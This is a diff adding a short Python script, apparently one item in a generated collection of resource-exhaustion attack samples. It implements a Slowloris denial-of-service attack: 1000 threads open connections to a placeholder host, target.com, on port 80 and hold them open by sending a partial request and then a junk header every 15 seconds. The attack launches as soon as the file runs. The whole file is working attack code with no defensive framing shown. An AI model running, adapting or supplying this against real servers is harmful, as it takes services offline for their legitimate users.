@@ -1,0 +1,29 @@
+# Resource Exhaustion - Concurrent Attack Sample 12
+# Created: 2026-03-30T22:24:11.730660
+# Type: Connection Flood / Thread Exhaustion / WebSocket Flood
+
+# Slowloris Attack - Sample 6
+import socket
+import threading
+import time
+
+def slowloris_attack():
+    target = "target.com"
+    port = 80
+    
+    def send_slow_headers():
+        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        sock.connect((target, port))
+        sock.send(b"GET / HTTP/1.1\r\n")
+        
+        while True:
+            sock.send(b"X-a: b\r\n")
+            time.sleep(15)
+    
+    threads = []
+    for i in range(1000):
+        t = threading.Thread(target=send_slow_headers)
+        t.start()
+        threads.append(t)
+
+slowloris_attack()
